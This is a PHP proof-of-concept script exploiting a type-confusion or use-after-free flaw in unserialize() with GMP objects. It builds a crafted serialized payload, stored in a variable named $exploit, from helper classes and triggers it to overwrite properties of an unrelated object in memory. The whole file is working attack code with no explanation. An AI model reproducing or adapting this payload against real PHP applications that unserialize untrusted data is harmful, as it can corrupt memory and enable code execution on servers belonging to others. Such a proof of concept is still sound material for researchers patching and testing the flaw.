<?php

class obj1 {
    function __destruct() {
        $this->test = $this->foo;		//need code line to rewrite zval
    }
}

class obj2 implements Serializable {
    function serialize() {
        return serialize($this->data);
    }

    function unserialize($data) {
        unserialize($data);				//need class that implements Serializable
    }
}

$obj = new stdClass;
$obj->aa = 1;
$obj->bb = 2;

$inner = 'O:4:"obj1":2:{s:4:"test";R:2;s:3:"foo";i:1;A';
$inner2 = 's:1:"1";a:3:{s:2:"aa";i:444;s:2:"bb";i:555;i:123;C:4:"obj2":'.strlen($inner).':{'.$inner.'}}';
$exploit = 'a:2:{i:1;C:3:"GMP":'.strlen($inner2).':{'.$inner2.'};i:2;i:123;}';
unserialize($exploit);

var_dump($obj);

?>